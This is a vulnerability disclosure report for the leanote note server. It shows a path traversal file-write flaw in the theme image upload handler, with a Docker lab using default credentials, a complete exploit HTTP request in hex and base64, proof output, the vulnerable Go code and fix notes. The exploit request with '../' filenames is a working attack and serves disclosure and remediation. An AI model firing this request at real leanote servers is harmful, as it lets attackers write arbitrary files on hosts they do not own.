### Vulnerability details

**Official website / Product:** https://github.com/leanote/leanote (http://leanote.org)

**Repository:** leanote/leanote (stars at selection: 11671)

**Vulnerability type:** file_upload (path traversal arbitrary file write)

**Vulnerability versions:** current master `d58fd6434f9dc1884d91eb5eb94a2083f9eb3ad3`; official binary / common Docker image axboy/leanote shipping **2.6.1** (`MemberBlogController.go` MD5-identical to master)

**Vulnerability URL / Parameter:** `POST /member/blog/uploadThemeImage?themeId=<id>`, multipart field `file` **filename**

**Complex:** yes

### Verification procedure

1. Bring up the lab with the compose below: image `axboy/leanote:latest` (official leanote-linux-amd64 binary **v2.6.1**), container name `leanote-r81-a3`, host port **26103** → container `9000`. Default install-data credentials **`admin` / `abc123`**. Audited commit master `d58fd6434f9dc1884d91eb5eb94a2083f9eb3ad3` (`MemberBlogController.go` MD5-identical to tag `2.6.1`).

```yaml
services:
  leanote:
    container_name: leanote-r81-a3
    image: axboy/leanote:latest
    ports:
      - "26103:9000"
    volumes:
      - leanote_r81a3_data:/data
    restart: unless-stopped

volumes:
  leanote_r81a3_data:
```

```bash
mkdir -p /tmp/leanote-r81-a3-lab && cd /tmp/leanote-r81-a3-lab
# Save the YAML above as docker-compose.yml, then:
docker compose up -d
# Wait until http://127.0.0.1:26103/login is reachable
```

2. Open `http://127.0.0.1:26103/login`, or `POST /doLogin` (form fields `email=admin`, `pwd=abc123`; add `captcha` if rate-limited) and capture the **`LEANOTE_SESSION`** cookie from `Set-Cookie` (Revel session). The Cookie in the PoC below is a lab capture — replace it with a fresh session when replaying.
3. After login, open `/member/blog/theme` and create/select any theme (or hit `/member/blog/updateTheme` with an empty `themeId` so the server runs `NewThemeForFirst` and redirects). This PoC used install-data themeId **`6ae91df3432057004f000004`**.
4. POST to `/member/blog/uploadThemeImage?themeId=...` with an image body whose multipart **filename** contains `../` (e.g. `../../../../../../../../../tmp/r81a3_verify_afw.jpg`). Filename must pass the image extension allowlist (`.gif/.jpg/.png/.bmp/.jpeg`).
5. Response HTML shows success (`resultCode: '1'` / `上传成功!`). Inside the container, confirm `/tmp/r81a3_verify_afw.jpg` exists with MD5 matching the uploaded payload and is **not** under the theme `images/` directory:

```bash
docker exec leanote-r81-a3 ls -la /tmp/r81a3_verify_afw.jpg
docker exec leanote-r81-a3 md5sum /tmp/r81a3_verify_afw.jpg
# Expected:
# -rwxr-xr-x 1 root root 57 ... /tmp/r81a3_verify_afw.jpg
# 6dfd98ed13987d4d94c00aaae219bece  /tmp/r81a3_verify_afw.jpg
```

### Complete vulnerability PoC

Complete HTTP request. The JPEG file part is hex-encoded (`Content-Transfer-Encoding: hex`) so the markdown stays text-safe without losing bytes; hex-decode yields the real 57-byte JPEG (MD5 `6dfd98ed13987d4d94c00aaae219bece`, marker `R81A3_THEME_UPLOAD_AFW_TO_TMP_PROOF`). On-the-wire Content-Length remains the original binary multipart length **274** (hex-decode the body before sending, or base64-decode the full raw request below).

```http
POST /member/blog/uploadThemeImage?themeId=6ae91df3432057004f000004 HTTP/1.1
Host: 127.0.0.1:26103
Cookie: LEANOTE_SESSION=7ff710744619ec54c754be2628e10415189d8db6-%00UsernameRaw%3Aadmin%00%00Logo%3A%2Fimages%2Fblog%2Fdefault_avatar.png%00%00NoteListWidth%3A266%00%00NotebookWidth%3A160%00%00Verified%3A0%00%00LeftIsMin%3A0%00%00_ID%3Aebeb6ee9ad8fb26637542706d53b1c024650d803f0622d12d2b7b35df6a6a570%00%00UserId%3A5368c1aa99c37b029d000001%00%00Email%3Aadmin%40leanote.com%00%00Username%3Aadmin%00%00Theme%3Asimple%00%00_TS%3A1793673368%00
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryR81A3LEANOTE
Content-Length: 274
Connection: close
User-Agent: leanote-r81-a3-poc
Accept: */*

------WebKitFormBoundaryR81A3LEANOTE
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../tmp/r81a3_verify_afw.jpg"
Content-Type: image/jpeg
Content-Transfer-Encoding: hex

ffd8ffe000104a4649460001010000010001000052383141335f5448454d455f55504c4f41445f4146575f544f5f544d505f50524f4f46ffd9
------WebKitFormBoundaryR81A3LEANOTE--

```

Full raw request base64 (decode to restore the on-the-wire binary multipart):

```
UE9TVCAvbWVtYmVyL2Jsb2cvdXBsb2FkVGhlbWVJbWFnZT90aGVtZUlkPTZhZTkx
ZGYzNDMyMDU3MDA0ZjAwMDAwNCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xOjI2
MTAzDQpDb29raWU6IExFQU5PVEVfU0VTU0lPTj03ZmY3MTA3NDQ2MTllYzU0Yzc1
NGJlMjYyOGUxMDQxNTE4OWQ4ZGI2LSUwMFVzZXJuYW1lUmF3JTNBYWRtaW4lMDAl
MDBMb2dvJTNBJTJGaW1hZ2VzJTJGYmxvZyUyRmRlZmF1bHRfYXZhdGFyLnBuZyUw
MCUwME5vdGVMaXN0V2lkdGglM0EyNjYlMDAlMDBOb3RlYm9va1dpZHRoJTNBMTYw
JTAwJTAwVmVyaWZpZWQlM0EwJTAwJTAwTGVmdElzTWluJTNBMCUwMCUwMF9JRCUz
QWViZWI2ZWU5YWQ4ZmIyNjYzNzU0MjcwNmQ1M2IxYzAyNDY1MGQ4MDNmMDYyMmQx
MmQyYjdiMzVkZjZhNmE1NzAlMDAlMDBVc2VySWQlM0E1MzY4YzFhYTk5YzM3YjAy
OWQwMDAwMDElMDAlMDBFbWFpbCUzQWFkbWluJTQwbGVhbm90ZS5jb20lMDAlMDBV
c2VybmFtZSUzQWFkbWluJTAwJTAwVGhlbWUlM0FzaW1wbGUlMDAlMDBfVFMlM0Ex
NzkzNjczMzY4JTAwDQpDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGE7
IGJvdW5kYXJ5PS0tLS1XZWJLaXRGb3JtQm91bmRhcnlSODFBM0xFQU5PVEUNCkNv
bnRlbnQtTGVuZ3RoOiAyNzQNCkNvbm5lY3Rpb246IGNsb3NlDQpVc2VyLUFnZW50
OiBsZWFub3RlLXI4MS1hMy1wb2MNCkFjY2VwdDogKi8qDQoNCi0tLS0tLVdlYktp
dEZvcm1Cb3VuZGFyeVI4MUEzTEVBTk9URQ0KQ29udGVudC1EaXNwb3NpdGlvbjog
Zm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9Ii4uLy4uLy4uLy4uLy4u
Ly4uLy4uLy4uLy4uL3RtcC9yODFhM192ZXJpZnlfYWZ3LmpwZyINCkNvbnRlbnQt
VHlwZTogaW1hZ2UvanBlZw0KDQr/2P/gABBKRklGAAEBAAABAAEAAFI4MUEzX1RI
RU1FX1VQTE9BRF9BRldfVE9fVE1QX1BST09G/9kNCi0tLS0tLVdlYktpdEZvcm1C
b3VuZGFyeVI4MUEzTEVBTk9URS0tDQo=
```

Complete HTTP response (raw Docker-lab response; UTF-8 body with BOM):

```http
HTTP/1.1 200 OK
Content-Length: 461
Content-Type: text/html; charset=utf-8
Set-Cookie: LEANOTE_FLASH=; Path=/; HttpOnly
Set-Cookie: LEANOTE_SESSION=2447307d39a31061ba7ceb455cd6289be6242cce-%00LeftIsMin%3A0%00%00_ID%3Aebeb6ee9ad8fb26637542706d53b1c024650d803f0622d12d2b7b35df6a6a570%00%00UserId%3A5368c1aa99c37b029d000001%00%00Username%3Aadmin%00%00UsernameRaw%3Aadmin%00%00Logo%3A%2Fimages%2Fblog%2Fdefault_avatar.png%00%00NoteListWidth%3A266%00%00NotebookWidth%3A160%00%00Theme%3Asimple%00%00Verified%3A0%00%00Email%3Aadmin%40leanote.com%00%00_TS%3A1793673383%00; Path=/; Expires=Tue, 03 Nov 2026 02:36:23 GMT; Max-Age=10800; HttpOnly
Date: Mon, 02 Nov 2026 23:36:23 GMT
Connection: close

﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>图片上传结果</title>
<script language="javascript" type="text/javascript">
window.parent.window.uploadFinish({
		filename:'',
		result: '上传成功!',
		resultCode: '1'
	});
</script>
</head>
</html>

```

Verification result notes:

- HTTP 200 with `result: '上传成功!', resultCode: '1'`.
- Container AFW proof (`docker exec` measured):

```
=== docker exec proof: AFW marker file outside theme images dir ===
-rwxr-xr-x 1 root root 57 Nov  3 07:36 /tmp/r81a3_verify_afw.jpg
6dfd98ed13987d4d94c00aaae219bece  /tmp/r81a3_verify_afw.jpg
CONTENT_HEX=ffd8ffe000104a4649460001010000010001000052383141335f5448454d
455f55504c4f41445f4146575f544f5f544d505f50524f4f46ffd9

=== local payload md5 ===
6dfd98ed13987d4d94c00aaae219bece  .../afw2.jpg
=== theme intended dir (should NOT contain verify file) ===
verify file absent from intended images dir (expected)
```

- Content includes marker `R81A3_THEME_UPLOAD_AFW_TO_TMP_PROOF`. Intended directory `.../themes/<themeId>/images/` does not contain this filename, proving the write escaped the theme images root.
- JPEG body hex: `ffd8ffe000104a4649460001010000010001000052383141335f5448454d455f55504c4f41445f4146575f544f5f544d505f50524f4f46ffd9` (57 bytes).

### Vulnerability analysis

`MemberBlog.uploadImage` (called by `UploadThemeImage`) only enforces an image extension allowlist. Unlike `FileController.uploadImage` / `AttachController.uploadAttach`, it does **not** replace the name with `newGuid + ext`; it keeps `handel.Filename` (including a no-op `filename = filename`) and writes via `toPath := dir + "/" + filename` + `ioutil.WriteFile`. Path segments in the filename therefore escape the theme `images` directory and write attacker content to arbitrary writable locations (lab: `/tmp`). Related residuals: `ImportTheme` keeps raw zip filenames; `ApiFile.GetAllAttachs` / `Attach.DownloadAll` use unsanitized `note.Title` in `os.Create` (also AFW of a tar.gz; confirmed separately, not double-counted).

### Trigger / sink source (full path and line numbers):

```go
# File: app/controllers/member/MemberBlogController.go
# Lines: 334-408 (critical sink: 373-398)
// 上传主题图片
func (c MemberBlog) UploadThemeImage(themeId string) revel.Result {
	re := c.uploadImage(themeId)
	c.ViewArgs["fileUrlPath"] = re.Id
	c.ViewArgs["resultCode"] = re.Code
	c.ViewArgs["resultMsg"] = re.Msg
	return c.RenderTemplate("file/blog_logo.html")
}
func (c MemberBlog) uploadImage(themeId string) (re info.Re) {
	var fileId = ""
	var resultCode = 0     // 1表示正常
	var resultMsg = "内部错误" // 错误信息
	var Ok = false

	defer func() {
		re.Id = fileId // 只是id, 没有其它信息
		re.Code = resultCode
		re.Msg = resultMsg
		re.Ok = Ok
	}()

	var data []byte
	c.Params.Bind(&data, "file")
	handel := c.Params.Files["file"][0]
	if data == nil || len(data) == 0 {
		return re
	}

	// 生成上传路径
	dir := themeService.GetThemeAbsolutePath(c.GetUserId(), themeId) + "/images"
	err := os.MkdirAll(dir, 0755)
	if err != nil {
		return re
	}
	// 生成新的文件名
	filename := handel.Filename

	var ext string

	_, ext = SplitFilename(filename)
	if ext != ".gif" && ext != ".jpg" && ext != ".png" && ext != ".bmp" && ext != ".jpeg" {
		resultMsg = "不是图片"
		return re
	}

	filename = filename
	// > 2M?
	if len(data) > 5*1024*1024 {
		resultCode = 0
		resultMsg = "图片大于2M"
		return re
	}

	toPath := dir + "/" + filename
	err = ioutil.WriteFile(toPath, data, 0777)
	if err != nil {
		LogJ(err)
		return re
	}
	TransToGif(toPath, 0, true)
	resultCode = 1
	resultMsg = "上传成功!"

	return re
}
```

### Fix notes

Force `filepath.Base` (drop directory components) and rename to `newGuid + ext` consistently with other upload handlers. After join/clean, require the resolved path to stay under the theme images root. Apply the same sanitization (or existing `FixFilename`) to `ImportTheme`, `GetAllAttachs`, and `DownloadAll`.
